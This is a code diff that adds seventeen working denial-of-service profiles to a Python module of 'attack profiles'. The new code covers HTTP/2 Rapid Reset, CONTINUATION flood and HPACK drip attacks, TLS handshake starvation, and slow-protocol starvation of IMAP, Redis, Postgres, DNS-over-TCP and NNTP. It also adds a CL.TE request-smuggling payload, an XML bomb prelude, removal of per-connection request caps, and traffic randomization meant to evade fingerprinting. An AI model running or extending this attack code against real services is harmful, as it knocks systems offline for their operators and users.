@@ -1,7 +1,7 @@
 """Attack profiles.
 
-14 classic + protocol TCP profiles plus the ``udp`` datagram mode (handled by
-``udp.py``/the engine) for 15 total modes:
+31 classic + protocol TCP profiles plus the ``udp`` datagram mode (handled by
+``udp.py``/the engine) for 32 total modes:
 
 * ``slow-post``   - send headers with a big Content-Length, then drip the
                     body one byte at a time (classic Tor's Hammer).
@@ -16,6 +16,40 @@
 * ``expect-continue-abuse`` - send headers with ``Expect: 100-continue`` and
                     stall the body after the interim response, keeping any
                     state the server allocated on ``100 Continue`` pinned.
+* ``imap-slow-literal`` - announce an IMAP ``{N}`` literal and never deliver N
+                    bytes, pinning the mailbox worker.
+* ``redis-resp-slow`` - declare an oversized RESP ``$len`` bulk and never close
+                    it, pinning a Redis client read handler.
+* ``postgres-startup-slow`` - over-promise a StartupMessage length and withhold
+                    the terminator, blocking the forked backend.
+* ``dns-tcp-slow`` - announce a large DNS-over-TCP message and never complete
+                    it, blocking the resolver's TCP query handler.
+* ``nntp-slow-post`` - start an NNTP article and never send the dot-terminator.
+* ``idle-hold`` - open a connection and send zero bytes, exhausting idle slot
+                    limits with nothing to fingerprint or rate-limit on.
+* ``slow-xml`` - announce an oversized ``Content-Length`` and stream an unclosed
+                    XML/``DOCTYPE`` prolog, keeping the XML parser buffering forever.
+* ``slow-form-parse`` - declare a huge urlencoded body and trickle endless
+                    ``key=value&`` pairs the form decoder never finishes.
+* ``header-count-flood`` - emit ~2000 tiny headers then complete the request,
+                    stressing per-header bookkeeping that caps size but not count.
+* ``websocket-slow-frame`` - finish the upgrade, then stream a frame whose
+                    declared payload length is never satisfied.
+* ``req-smuggling-probe`` - send an ambiguous ``Content-Length`` +
+                    ``Transfer-Encoding: chunked`` CL.TE request-smuggling probe.
+* ``h2-rapid-reset`` - over one HTTP/2 connection open a rapid run of streams and
+                    ``RST_STREAM`` each immediately (CVE-2023-44487 class).
+* ``h2-slow-streams`` - open many streams whose ``HEADERS`` omit ``END_STREAM``,
+                    then trickle a byte of ``DATA`` forever, pinning half-open state.
+* ``h2-continuation-flood`` - start a header block and keep it open with an
+                    unbounded run of ``CONTINUATION`` frames that never set ``END_HEADERS``.
+* ``h2-hpack-drip`` - feed one valid HPACK block a single octet per frame with a
+                    random delay, the HTTP/2 analogue of a slowloris header drip.
+* ``tls-slow-hello`` - announce a TLS handshake record far larger than the bytes
+                    delivered and dribble a ClientHello that never completes,
+                    pinning the server's handshake reassembly buffer.
+* ``tls-renego-hold`` - repeatedly emit fresh (partial) ClientHello records to
+                    churn (re)handshake initiation and pin handshake state.
 
 Every connection randomizes its headers, User-Agent, path query and timing
 to make the traffic harder to fingerprint.
@@ -24,11 +58,15 @@ to make the traffic harder to fingerprint.
 from __future__ import annotations
 
 import asyncio
+import base64
 import random
 import secrets
 import string
+import struct
+import time
 from abc import ABC, abstractmethod
 
+from . import h2, tls
 from .config import Config
 from .stats import Stats
 
@@ -148,6 +186,74 @@ async def _halt(stop: asyncio.Event, config: Config) -> None:
         pass
 
 
+async def _read_available(reader: asyncio.StreamReader, max_bytes: int = 1 << 20) -> bytes:
+    """Return bytes already buffered by the peer without blocking the loop.
+
+    ``asyncio.wait_for(reader.read(n), timeout=0)`` never reaps anything: the
+    read task is only *scheduled*, then immediately cancelled before its first
+    step runs. Instead we schedule the read and yield the loop a couple of
+    times so any already-arrived bytes are delivered and the read completes;
+    if it has not completed by then we cancel and treat it as "nothing yet".
+    """
+    task = asyncio.ensure_future(reader.read(max_bytes))
+    for _ in range(2):
+        await asyncio.sleep(0)
+        if task.done():
+            break
+    if task.done() and not task.cancelled():
+        try:
+            return task.result()
+        except (OSError, asyncio.IncompleteReadError):
+            return b""
+    task.cancel()
+    return b""
+
+
+async def _drain_responses(
+    reader: asyncio.StreamReader, stats: Stats, *, sent_at: float | None = None
+) -> None:
+    """Consume any bytes the peer has already sent, without blocking.
+
+    Pipelining/range profiles never await a full response; if left unread, the
+    server's replies fill our TCP receive window, advertising zero and stalling
+    our own writes. This drains buffered response bytes so the send window stays
+    open and pressure remains continuous. When ``sent_at`` is supplied and a
+    reply is present, the request->response latency and any HTTP status codes
+    are recorded for the advisory impact verdict.
+    """
+    data = await _read_available(reader)
+    if data:
+        stats.record_response_bytes(data)
+        if sent_at is not None:
+            stats.record_response_latency(time.monotonic() - sent_at)
+
+
+async def _announce_then_dribble(
+    writer: asyncio.StreamWriter,
+    stats: Stats,
+    config: Config,
+    stop: asyncio.Event,
+    announce: bytes,
+    count: int,
+) -> bool:
+    """Send a protocol framing ``announce`` then drip ``count`` body bytes.
+
+    Shared by the protocol-starvation profiles (IMAP literal, Redis bulk string,
+    Postgres startup, DNS-over-TCP) whose servers parse a declared length and
+    then block waiting for exactly that many octets. We announce an oversized
+    length, emit only a few bytes, and never complete the element - pinning the
+    server's request handler. Returns ``False`` if stopped early, ``True`` once
+    all ``count`` bytes were sent (the caller then holds the socket open).
+    """
+    await _write(writer, announce, stats, config)
+    sent = 0
+    while not stop.is_set() and sent < count:
+        await _write(writer, _dribble(), stats, config)
+        sent += 1
+        await _halt(stop, config)
+    return not stop.is_set()
+
+
 class Profile(ABC):
     """Base class for attack profiles."""
 
@@ -196,6 +302,7 @@ class SlowPost(Profile):
             await _write(writer, _dribble(), stats, config)
             sent += 1
             await _halt(stop, config)
+        return not stop.is_set()  # True if completed, False if interrupted
 
 
 class SlowPostHeaders(Profile):
@@ -217,6 +324,7 @@ class SlowPostHeaders(Profile):
             await _write(writer, _dribble(), stats, config)
             sent += 1
             await _halt(stop, config)
+        return not stop.is_set()  # True if completed, False if interrupted
 
 
 class SlowHeaders(Profile):
@@ -252,6 +360,8 @@ class SlowRead(Profile):
             + "\r\n\r\n"
         ).encode()
         await _write(writer, req, stats, config)
+        sent_at = time.monotonic()
+        first = True
         while not stop.is_set():
             try:
                 chunk = await asyncio.wait_for(reader.read(8), timeout=config.connect_timeout * 2)
@@ -259,7 +369,10 @@ class SlowRead(Profile):
                 continue
             if not chunk:  # server closed the connection
                 break
-            stats.bytes_received += len(chunk)
+            stats.record_response_bytes(chunk)
+            if first:  # first reply marks this connection's response latency
+                stats.record_response_latency(time.monotonic() - sent_at)
+                first = False
             await _halt(stop, config)
         return not stop.is_set()  # True if completed, False if interrupted
 
@@ -292,6 +405,7 @@ class Chunked(Profile):
             await _write(writer, f"{size:x}\r\n".encode() + payload + b"\r\n", stats, config)
             sent += size
             await _halt(stop, config)
+        return not stop.is_set()  # True if completed, False if interrupted
 
 
 class WebSocketSlowUpgrade(Profile):
@@ -339,19 +453,19 @@ class HttpPipelining(Profile):
     name = "http-pipelining"
 
     async def run(self, reader, writer, config, ua, stats, stop):
-        # Send multiple HTTP requests without waiting for responses
+        # Hold one connection and keep a pipeline of requests in flight for the
+        # whole run instead of capping at a fixed count and reconnecting. We
+        # opportunistically drain any responses that arrive so our TCP send
+        # window never closes and pressure stays continuous.
         method = config.method or "GET"
         headers = _base_headers(config, ua)
         req = (
             f"{method} {_path(config)} HTTP/1.1\r\n" + "\r\n".join(headers) + "\r\n\r\n"
         ).encode()
 
-        # Send multiple requests in pipeline
-        request_count = 0
-        while not stop.is_set() and request_count < 50:  # Limit to 50 requests per connection
+        while not stop.is_set():
             await _write(writer, req, stats, config)
-            request_count += 1
-            # Small delay between requests to keep connection alive
+            await _drain_responses(reader, stats, sent_at=time.monotonic())
             await _halt(stop, config)
 
         return not stop.is_set()
@@ -361,14 +475,13 @@ class RangeHeaderAbuse(Profile):
     name = "range-abuse"
 
     async def run(self, reader, writer, config, ua, stats, stop):
-        # Send many byte range requests to exhaust file handle limits
+        # Continuously issue distinct byte-range requests on one connection to
+        # exhaust file-handle/range-parser limits for the full duration rather
+        # than stopping after a fixed batch. Responses are drained as they
+        # arrive to keep the send window open.
         method = config.method or "GET"
-        request_count = 0
-        while (
-            not stop.is_set() and request_count < 100
-        ):  # Limit to 100 range requests per connection
+        while not stop.is_set():
             headers = _base_headers(config, ua)
-            # Add random Range header
             start = random.randint(0, 1000000)
             end = start + random.randint(100, 10000)
             headers.append(f"Range: bytes={start}-{end}")
@@ -378,8 +491,7 @@ class RangeHeaderAbuse(Profile):
             ).encode()
 
             await _write(writer, req, stats, config)
-            request_count += 1
-            # Small delay between requests
+            await _drain_responses(reader, stats, sent_at=time.monotonic())
             await _halt(stop, config)
 
         return not stop.is_set()
@@ -590,6 +702,7 @@ class ExpectContinueAbuse(Profile):
             + "\r\n\r\n"
         ).encode()
         await _write(writer, req, stats, config)
+        sent_at = time.monotonic()
         # Give the server a beat to answer with `100 Continue` (or a final
         # rejection); consume whatever arrived without blocking past the
         # configured read deadline, then keep the promised body stalled.
@@ -598,7 +711,8 @@ class ExpectContinueAbuse(Profile):
         except TimeoutError:
             interim = b""
         if interim:
-            stats.bytes_received += len(interim)
+            stats.record_response_bytes(interim)
+            stats.record_response_latency(time.monotonic() - sent_at)
         if stop.is_set():
             return False
 
@@ -611,6 +725,419 @@ class ExpectContinueAbuse(Profile):
         # open instead of closing it.
         while not stop.is_set():
             await _halt(stop, config)
+        return not stop.is_set()
+
+
+class ImapSlowLiteral(Profile):
+    name = "imap-slow-literal"
+
+    async def run(self, reader, writer, config, ua, stats, stop):
+        # IMAP literals: `<tag> APPEND INBOX {N}` makes the server reply `+ ` and
+        # block until it has read exactly N octets. Announce a large literal,
+        # drip a few bytes, then never close it - the mailbox worker stays
+        # pinned waiting for the rest of the literal.
+        tag = _rand_token(4).upper()
+        length = random.randint(config.base_post_length, config.base_post_length * 4)
+        announce = f"{tag} APPEND INBOX {{{length}}}\r\n".encode()
+        if not await _announce_then_dribble(writer, stats, config, stop, announce, 16):
+            return False
+        while not stop.is_set():
+            await _write(writer, _dribble(), stats, config)
+            await _halt(stop, config)
+        return not stop.is_set()
+
+
+class RedisRespSlow(Profile):
+    name = "redis-resp-slow"
+
+    async def run(self, reader, writer, config, ua, stats, stop):
+        # RESP bulk strings `$<len>\r\n` make Redis size a read handler and wait
+        # for exactly len bytes plus a trailing CRLF. Declare a huge bulk
+        # argument inside a one-element multibulk command, emit a few bytes, then
+        # stall forever with the terminating CRLF withheld.
+        length = random.randint(config.base_post_length, config.base_post_length * 4)
+        announce = f"*1\r\n${length}\r\n".encode()
+        if not await _announce_then_dribble(writer, stats, config, stop, announce, 8):
+            return False
+        while not stop.is_set():
+            await _write(writer, _dribble(), stats, config)
+            await _halt(stop, config)
+        return not stop.is_set()
+
+
+class PostgresStartupSlow(Profile):
+    name = "postgres-startup-slow"
+
+    async def run(self, reader, writer, config, ua, stats, stop):
+        # A Postgres frontend StartupMessage is Int32 length (counting itself) +
+        # Int32 protocol version (196608 == 3.0) + NUL-separated key/value pairs
+        # + a final NUL. Claim a length far larger than we ever send and omit the
+        # terminator: the forked backend blocks in secure_read for the packet.
+        declared_body = config.base_post_length
+        total = 8 + declared_body  # 4-byte length field + 4-byte version
+        kv = b"user=slowprobe\x00database=postgres\x00"
+        announce = struct.pack(">II", total, 196608) + kv
+        if not await _announce_then_dribble(writer, stats, config, stop, announce, 8):
+            return False
+        while not stop.is_set():
+            await _write(writer, _dribble(), stats, config)
+            await _halt(stop, config)
+        return not stop.is_set()
+
+
+class DnsTcpSlow(Profile):
+    name = "dns-tcp-slow"
+
+    async def run(self, reader, writer, config, ua, stats, stop):
+        # DNS-over-TCP prefixes every message with a 2-byte big-endian length.
+        # Announce a large query, emit the 12-byte header plus a couple of
+        # question bytes, then never complete it, so the resolver's TCP handler
+        # blocks waiting for the declared octets.
+        declared = config.base_post_length
+        # Partial query header: ID, flags=RD, QDCOUNT=1, AN/NS/AR=0.
+        header = struct.pack(">HHHHHH", 0xAABB, 0x0100, 1, 0, 0, 0)
+        announce = struct.pack(">H", declared) + header
+        if not await _announce_then_dribble(writer, stats, config, stop, announce, 8):
+            return False
+        while not stop.is_set():
+            await _write(writer, _dribble(), stats, config)
+            await _halt(stop, config)
+        return not stop.is_set()
+
+
+class NntpSlowPost(Profile):
+    name = "nntp-slow-post"
+
+    async def run(self, reader, writer, config, ua, stats, stop):
+        # NNTP POST: after `POST\r\n` the server replies 340 and reads an article
+        # terminated by a line containing only a single `.`. Send POST, drip
+        # header/body lines slowly, and never emit the terminating dot-line, so
+        # the reader process stays parked mid-transfer.
+        if not await _announce_then_dribble(writer, stats, config, stop, b"POST\r\n", 8):
+            return False
+        while not stop.is_set():
+            line = f"X-{_rand_token(6)}: {_rand_token(12)}\r\n"
+            await _write(writer, line.encode(), stats, config)
+            await _halt(stop, config)
+        return not stop.is_set()
+
+
+class IdleHold(Profile):
+    name = "idle-hold"
+
+    async def run(self, reader, writer, config, ua, stats, stop):
+        # Zero-byte idle: open the connection and send NOTHING, holding the
+        # socket until stopped. Exhausts servers that cap concurrent connections
+        # or idle worker slots (or accept-before-request pools) with no request
+        # bytes to fingerprint or rate-limit on.
+        while not stop.is_set():
+            await _halt(stop, config)
+        return not stop.is_set()
+
+
+def _strip_framing(headers: list[str]) -> list[str]:
+    """Drop headers that would clash with a profile's own request framing."""
+    drop = {"content-length", "transfer-encoding", "expect", "te"}
+    return [h for h in headers if h.split(":", 1)[0].strip().lower() not in drop]
+
+
+class SlowXml(Profile):
+    name = "slow-xml"
+
+    async def run(self, reader, writer, config, ua, stats, stop):
+        # Feed the target's XML parser a billion-laughs / XXE-shaped document
+        # prefix with an oversized Content-Length, then dribble body bytes so
+        # the (potentially entity-expanding) parser keeps buffering a document
+        # that never terminates.
+        method = config.method or "POST"
+        headers = _strip_framing(_base_headers(config, ua))
+        length = random.randint(config.base_post_length * 4, config.base_post_length * 8)
+        headers.append("Content-Type: application/xml")
+        headers.append(f"Content-Length: {length}")
+        req = (
+            f"{method} {_path(config)} HTTP/1.1\r\n" + "\r\n".join(headers) + "\r\n\r\n"
+        ).encode()
+        await _write(writer, req, stats, config)
+        prelude = b'<?xml version="1.0"?>\n<!DOCTYPE bomb [ <!ENTITY a "'
+        await _write(writer, prelude, stats, config)
+        while not stop.is_set():
+            await _write(writer, _dribble(), stats, config)
+            await _halt(stop, config)
+        return not stop.is_set()
+
+
+class SlowFormParse(Profile):
+    name = "slow-form-parse"
+
+    async def run(self, reader, writer, config, ua, stats, stop):
+        # Announce a huge urlencoded body and emit endless `key=value&` pairs.
+        # Frameworks split-and-decode urlencoded bodies field by field while
+        # filling a buffer sized from Content-Length; withholding the last pair
+        # keeps that parse - and any per-request memory - pinned.
+        method = config.method or "POST"
+        headers = _strip_framing(_base_headers(config, ua))
+        length = random.randint(config.base_post_length * 8, config.base_post_length * 16)
+        headers.append("Content-Type: application/x-www-form-urlencoded")
+        headers.append(f"Content-Length: {length}")
+        req = (
+            f"{method} {_path(config)} HTTP/1.1\r\n" + "\r\n".join(headers) + "\r\n\r\n"
+        ).encode()
+        await _write(writer, req, stats, config)
+        while not stop.is_set():
+            field = f"{_rand_token(6)}={_rand_token(16)}&".encode()
+            await _write(writer, field, stats, config)
+            await _halt(stop, config)
+        return not stop.is_set()
+
+
+class HeaderCountFlood(Profile):
+    name = "header-count-flood"
+
+    async def run(self, reader, writer, config, ua, stats, stop):
+        # Many servers cap header *size* but not header *count*. Emit thousands
+        # of tiny headers and then COMPLETE the request, forcing the parser to
+        # allocate and index the whole header block (a different failure mode
+        # from slowloris, which never finishes headers at all).
+        method = config.method or "GET"
+        await _write(writer, f"{method} {_path(config)} HTTP/1.1\r\n".encode(), stats, config)
+        await _write(writer, f"Host: {config.header_host}\r\n".encode(), stats, config)
+        n = 0
+        while not stop.is_set() and n < 2000:
+            await _write(
+                writer, f"X-{_rand_token(6)}: {_rand_token(4)}\r\n".encode(), stats, config
+            )
+            n += 1
+            if n % 64 == 0:
+                await _halt(stop, config)
+        if stop.is_set():
+            return False
+        await _write(writer, b"\r\n", stats, config)  # complete the header block
+        while not stop.is_set():
+            await _halt(stop, config)
+        return not stop.is_set()
+
+
+class WebSocketSlowFrame(Profile):
+    name = "websocket-slow-frame"
+
+    async def run(self, reader, writer, config, ua, stats, stop):
+        # Unlike websocket-slow-upgrade (which never completes the handshake),
+        # this finishes the upgrade request and then streams a WebSocket frame
+        # whose declared (masked) payload length is never satisfied - exercising
+        # post-handshake frame readers rather than the HTTP header parser.
+        method = config.method or "GET"
+        headers = _base_headers(config, ua)
+        headers.append("Upgrade: websocket")
+        headers.append("Connection: Upgrade")
+        ws_key = base64.b64encode(secrets.token_bytes(16)).decode()
+        headers.append(f"Sec-WebSocket-Key: {ws_key}")
+        headers.append("Sec-WebSocket-Version: 13")
+        req = (
+            f"{method} {_path(config)} HTTP/1.1\r\n" + "\r\n".join(headers) + "\r\n\r\n"
+        ).encode()
+        await _write(writer, req, stats, config)
+        # FIN|text(0x81); MASK set with 16-bit extended length (0xFF), declared
+        # payload size, then the 4-byte masking key - then never the payload.
+        declared = 4096
+        frame_head = bytes([0x81, 0xFF]) + struct.pack(">H", declared) + secrets.token_bytes(4)
+        await _write(writer, frame_head, stats, config)
+        while not stop.is_set():
+            await _write(writer, _dribble(), stats, config)
+            await _halt(stop, config)
+        return not stop.is_set()
+
+
+class ReqSmugglingProbe(Profile):
+    name = "req-smuggling-probe"
+
+    async def run(self, reader, writer, config, ua, stats, stop):
+        # CL.TE request-smuggling probe: present BOTH a Content-Length and
+        # Transfer-Encoding: chunked so a front-end and back-end that disagree
+        # on the framing desynchronize. This is a detection probe (authorized
+        # testing only): it sends the ambiguous request once, then holds the
+        # socket so the differential parser state / smuggled byte remains visible
+        # in the response rather than grinding a slow-connection primitive.
+        method = config.method or "POST"
+        headers = _strip_framing(_base_headers(config, ua))
+        headers.append("Content-Length: 6")
+        headers.append("Transfer-Encoding: chunked")
+        req = (
+            f"{method} {_path(config)} HTTP/1.1\r\n" + "\r\n".join(headers) + "\r\n\r\n"
+        ).encode()
+        # A chunked terminator plus a smuggled second-request prefix; a parser
+        # trusting Content-Length leaves these bytes to poison the next request.
+        probe_body = b"0\r\n\r\nGET /smuggled HTTP/1.1\r\n\r\n"
+        await _write(writer, req + probe_body, stats, config)
+        # Hold so the target's (differential) handling of the body is observable.
+        while not stop.is_set():
+            await _halt(stop, config)
+        return not stop.is_set()
+
+
+class H2RapidReset(Profile):
+    name = "h2-rapid-reset"
+
+    async def run(self, reader, writer, config, ua, stats, stop):
+        # HTTP/2 Rapid Reset (CVE-2023-44487 class): on one connection, open a
+        # continuous stream of requests and RST_STREAM each immediately after
+        # sending its (complete) HEADERS. The server allocates then tears down
+        # per-stream state far faster than it can serve, exhausting workers with
+        # almost no bandwidth. Headers/frames are hand-built in h2.py (no crates).
+        await _write(writer, h2.PREFACE + h2.settings() + h2.settings_ack(), stats, config)
+        authority = config.header_host
+        method = config.method or "GET"
+        stream_id = 1
+        while not stop.is_set():
+            burst = bytearray()
+            for _ in range(512):
+                block = h2.request_block(method, _path(config), authority, extra={"user-agent": ua})
+                burst += h2.frame(stream_id, h2.HEADERS, h2.END_HEADERS | h2.END_STREAM, block)
+                burst += h2.rst_stream(stream_id, h2.NO_ERROR)
+                stream_id += 2
+                if stream_id > 0x7FFFFFF0:
+                    stream_id = 1
+            await _write(writer, bytes(burst), stats, config)
+            await _drain_responses(reader, stats)
+        return not stop.is_set()
+
+
+class H2SlowStreams(Profile):
+    name = "h2-slow-streams"
+
+    async def run(self, reader, writer, config, ua, stats, stop):
+        # Open many streams whose HEADERS omit END_STREAM (so each awaits a
+        # request body), then trickle a byte of DATA onto them forever without
+        # ever finishing a stream. Every half-open stream pins per-stream
+        # bookkeeping / flow-control state on the target.
+        await _write(writer, h2.PREFACE + h2.settings() + h2.settings_ack(), stats, config)
+        authority = config.header_host
+        streams: list[int] = []
+        for _ in range(32):
+            sid = 1 + 2 * len(streams)
+            block = h2.request_block(
+                "POST", _path(config), authority, extra={"content-type": "application/octet-stream"}
+            )
+            await _write(writer, h2.frame(sid, h2.HEADERS, h2.END_HEADERS, block), stats, config)
+            streams.append(sid)
+        while not stop.is_set():
+            for sid in streams:
+                await _write(writer, h2.data(sid, _dribble()), stats, config)
+                await _drain_responses(reader, stats)
+                if stop.is_set():
+                    break
+            await _halt(stop, config)
+        return not stop.is_set()
+
+
+class H2ContinuationFlood(Profile):
+    name = "h2-continuation-flood"
+
+    async def run(self, reader, writer, config, ua, stats, stop):
+        # Flood the frame-reassembly layer: start a header block with a HEADERS
+        # frame whose END_HEADERS is clear, then keep the block open with an
+        # unbounded run of CONTINUATION frames (which RFC 7540 requires to
+        # immediately follow, so nothing else can be interleaved). The header
+        # block is never completed, so the server keeps buffering reassembled
+        # header state and counting an ever-growing number of frames.
+        await _write(writer, h2.PREFACE + h2.settings() + h2.settings_ack(), stats, config)
+        sid = 1
+        first = h2.header_field(":method", config.method or "GET")
+        await _write(writer, h2.frame(sid, h2.HEADERS, 0, first), stats, config)
+        frag = h2.header_field("x-flood", _rand_token(8))
+        n = 0
+        while not stop.is_set():
+            chunk = bytearray()
+            for _ in range(256):
+                chunk += h2.continuation(sid, frag)
+                n += 1
+            await _write(writer, bytes(chunk), stats, config)
+            await _drain_responses(reader, stats)
+            if n % 2048 == 0:
+                await _halt(stop, config)
+        return not stop.is_set()
+
+
+class H2HpackDrip(Profile):
+    name = "h2-hpack-drip"
+
+    async def run(self, reader, writer, config, ua, stats, stop):
+        # The HTTP/2 analogue of slowloris, done at the framing/HPACK layer: build
+        # one valid request header block, then feed it to the server a single
+        # octet per frame - one byte in HEADERS, then one byte per CONTINUATION -
+        # with a random delay between, setting END_HEADERS only on the final byte.
+        # A stalled drip leaves an incomplete header block pinned; a completed one
+        # (POST, no END_STREAM) leaves the stream waiting for a body.
+        await _write(writer, h2.PREFACE + h2.settings() + h2.settings_ack(), stats, config)
+        block = h2.request_block(
+            config.method or "POST",
+            _path(config),
+            config.header_host,
+            extra={"user-agent": ua, "accept": random.choice(_ACCEPTS)},
+        )
+        sid = 1
+        await _write(writer, h2.frame(sid, h2.HEADERS, 0, block[:1]), stats, config)
+        rest = block[1:]
+        for i, byte in enumerate(rest):
+            if stop.is_set():
+                return False
+            last = i == len(rest) - 1
+            await _write(
+                writer,
+                h2.continuation(sid, bytes([byte]), end_headers=last),
+                stats,
+                config,
+            )
+            await _halt(stop, config)
+        # Block complete but no body/END_STREAM; hold the stream open.
+        while not stop.is_set():
+            await _halt(stop, config)
+        return not stop.is_set()
+
+
+class TlsSlowHello(Profile):
+    name = "tls-slow-hello"
+
+    async def run(self, reader, writer, config, ua, stats, stop):
+        # TLS handshake starvation (the TLS-layer analogue of slowloris): announce
+        # a handshake *record* whose declared length far exceeds the bytes we ever
+        # deliver, open a ClientHello inside it, then dribble a few body bytes at a
+        # random delay and never complete the record. The server sizes its
+        # handshake reassembly buffer from the record length and blocks in that
+        # read, pinning a handshake worker/connection slot at near-zero bandwidth.
+        # TLS bytes are hand-built in tls.py (no crates); the socket is left raw
+        # (target an ``http://host:port`` reaching the TLS listener directly).
+        announce = tls.starved_client_hello(secrets.token_bytes(32))
+        await _announce_then_dribble(writer, stats, config, stop, announce, count=32)
+        # Record never completed; hold the socket so the pinned buffer stays live.
+        while not stop.is_set():
+            await _halt(stop, config)
+        return not stop.is_set()
+
+
+class TlsRenegoHold(Profile):
+    name = "tls-renego-hold"
+
+    async def run(self, reader, writer, config, ua, stats, stop):
+        # (Re)handshake-initiation churn: a fresh ClientHello is what a client
+        # sends to start (or renegotiate) a TLS session, forcing the server to
+        # allocate handshake state and, on completion, run expensive asymmetric
+        # crypto. Here we repeatedly emit a new starved ClientHello record - each a
+        # fresh handshake initiation - dribbling a byte and never completing any
+        # one, so the server re-enters its handshake state machine and pins
+        # renegotiation/handshake buffers over and over on a single connection.
+        while not stop.is_set():
+            announce = tls.starved_client_hello(
+                secrets.token_bytes(32),
+                declared_record_len=2048,
+                header_body_bytes=6,
+            )
+            await _write(writer, announce, stats, config)
+            for _ in range(8):
+                if stop.is_set():
+                    return False
+                await _write(writer, _dribble(), stats, config)
+                await _halt(stop, config)
+            await _drain_responses(reader, stats)
         return not stop.is_set()
 
 
@@ -629,4 +1156,21 @@ PROFILES: dict[str, type[Profile]] = {
     FtpSlowCommand.name: FtpSlowCommand,
     MultipartSlowUpload.name: MultipartSlowUpload,
     ExpectContinueAbuse.name: ExpectContinueAbuse,
+    ImapSlowLiteral.name: ImapSlowLiteral,
+    RedisRespSlow.name: RedisRespSlow,
+    PostgresStartupSlow.name: PostgresStartupSlow,
+    DnsTcpSlow.name: DnsTcpSlow,
+    NntpSlowPost.name: NntpSlowPost,
+    IdleHold.name: IdleHold,
+    SlowXml.name: SlowXml,
+    SlowFormParse.name: SlowFormParse,
+    HeaderCountFlood.name: HeaderCountFlood,
+    WebSocketSlowFrame.name: WebSocketSlowFrame,
+    ReqSmugglingProbe.name: ReqSmugglingProbe,
+    H2RapidReset.name: H2RapidReset,
+    H2SlowStreams.name: H2SlowStreams,
+    H2ContinuationFlood.name: H2ContinuationFlood,
+    H2HpackDrip.name: H2HpackDrip,
+    TlsSlowHello.name: TlsSlowHello,
+    TlsRenegoHold.name: TlsRenegoHold,
 }
